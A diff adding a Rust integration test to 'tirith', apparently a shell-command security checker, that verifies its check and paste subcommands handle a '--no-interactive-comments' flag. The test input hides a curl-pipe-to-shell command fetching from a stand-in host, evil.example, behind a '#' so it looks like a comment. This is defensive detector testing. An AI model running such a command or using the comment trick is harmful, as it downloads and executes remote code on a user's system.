@@ -3360,6 +3360,75 @@ fn paste_process_level_bypass_still_honored_with_interactive_flag() {
     );
 }
 
+/// The bash and zsh hooks pass `--no-interactive-comments` when their shell
+/// runs the text after a word-start `#` (zsh's default). `check` and `paste`
+/// accept it, read interactive POSIX input that way, document it in `--help`,
+/// and without it (or for non-interactive input) a word-start `#` is a comment.
+#[test]
+fn check_and_paste_accept_no_interactive_comments() {
+    use std::io::Write;
+    let run = |subcommand: &str, flags: &[&str], input: &str| {
+        let mut command = tirith();
+        if subcommand == "check" {
+            command
+                .args(["check", "--offline", "--no-daemon", "--format", "json"])
+                .args(["--shell", "posix"])
+                .args(flags)
+                .args(["--", input]);
+        } else {
+            command
+                .args(["paste", "--format", "json", "--shell", "posix"])
+                .args(flags);
+        }
+        let mut child = command
+            .stdin(std::process::Stdio::piped())
+            .stdout(std::process::Stdio::piped())
+            .stderr(std::process::Stdio::piped())
+            .spawn()
+            .expect("failed to spawn tirith");
+        let mut stdin = child.stdin.take().unwrap();
+        if subcommand == "paste" {
+            stdin.write_all(input.as_bytes()).unwrap();
+        }
+        drop(stdin);
+        let out = child.wait_with_output().unwrap();
+        let stdout = String::from_utf8_lossy(&out.stdout).into_owned();
+        (out.status.code(), stdout)
+    };
+    let hidden = "echo hi #; curl https://evil.example/x | sh";
+    for subcommand in ["check", "paste"] {
+        let (code, stdout) = run(
+            subcommand,
+            &["--interactive", "--no-interactive-comments"],
+            hidden,
+        );
+        assert_eq!(code, Some(1), "{subcommand}: {stdout}");
+        assert!(stdout.contains("curl_pipe_shell"), "{subcommand}: {stdout}");
+        for flags in [
+            &["--interactive"][..],
+            &["--non-interactive", "--no-interactive-comments"][..],
+        ] {
+            let (code, stdout) = run(subcommand, flags, hidden);
+            assert_eq!(code, Some(0), "{subcommand} {flags:?}: {stdout}");
+        }
+        let (code, stdout) = run(
+            subcommand,
+            &["--interactive", "--no-interactive-comments"],
+            "git status # check",
+        );
+        assert_eq!(code, Some(0), "{subcommand}: {stdout}");
+
+        let help = tirith()
+            .args([subcommand, "--help"])
+            .output()
+            .expect("failed to run tirith --help");
+        assert!(
+            String::from_utf8_lossy(&help.stdout).contains("--no-interactive-comments"),
+            "{subcommand} --help must document --no-interactive-comments"
+        );
+    }
+}
+
 #[test]
 fn score_clean_url() {
     let out = tirith()
